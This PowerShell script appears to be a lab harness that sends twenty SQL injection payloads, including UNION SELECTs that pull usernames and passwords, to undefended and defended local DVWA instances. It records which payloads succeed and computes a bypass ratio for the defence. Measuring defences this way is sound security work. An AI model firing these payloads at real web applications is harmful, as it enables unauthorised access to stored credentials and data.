# 03_sqli.ps1 — graded d for SQL injection (CWE-89). Set $sess from 01_login.ps1.
param([string]$sess = $env:DVWA_SESS)

# --- resolve results dir relative to THIS script (works from any CWD) ---
$RES = Join-Path (Split-Path -Parent $PSScriptRoot) "results"
if (-not (Test-Path $RES)) { New-Item -ItemType Directory -Force -Path $RES | Out-Null }

$cookie = "PHPSESSID=$sess; security=low"
$U="http://localhost:8081/vulnerabilities/sqli/"; $D="http://localhost:9081/vulnerabilities/sqli/"
$payloads=@("1' OR '1'='1","1' OR 1=1-- -","1' OR 1=1#","1' UNION SELECT user,password FROM users-- -",
 "1' UNION SELECT null,version()-- -","1' AND 1=1-- -","1' AND 1=2-- -","1'/**/OR/**/1=1-- -","1' oR '1'='1",
 "1' Or 1=1-- -","1'||'1'='1","1' OR 'a'='a","1') OR ('1'='1","1' OR 1=1 LIMIT 1-- -","1' UNION ALL SELECT 1,2-- -",
 "%31%27%20OR%20%271%27%3D%271","1' OR 1 GROUP BY 1-- -","1' OR sleep(0)-- -","1'+OR+'1'='1","1' OR/**/1=1-- -")
$rows=@()
foreach($p in $payloads){
 $qs="?id=$([uri]::EscapeDataString($p))&Submit=Submit"
 $ru=curl.exe -s -w "HTTPSTATUS:%{http_code}" -b $cookie "$U$qs"
 $cU=($ru|Select-String "HTTPSTATUS:(\d+)").Matches.Groups[1].Value
 $hU=if($ru -match "First name|Surname|admin|Gordon|Smith"){1}else{0}
 $rd=curl.exe -s -w "HTTPSTATUS:%{http_code}" -b $cookie "$D$qs"
 $cD=($rd|Select-String "HTTPSTATUS:(\d+)").Matches.Groups[1].Value
 $hD=if($rd -match "First name|Surname|admin|Gordon|Smith"){1}else{0}
 $rows+=[pscustomobject]@{payload=$p;undef_code=$cU;undef_hit=$hU;def_code=$cD;def_hit=$hD}}
$rows|Format-Table -AutoSize
$rows|Export-Csv -NoTypeInformation -Encoding UTF8 $RES\sqli_payload_matrix.csv
$nU=($rows|?{$_.undef_hit -eq 1}).Count; $nD=($rows|?{$_.def_hit -eq 1}).Count
$d=if($nU-gt 0){[math]::Round($nD/$nU,3)}else{"N/A"}
Write-Host "d(SQLi) = $nD / $nU = $d" -ForegroundColor Green
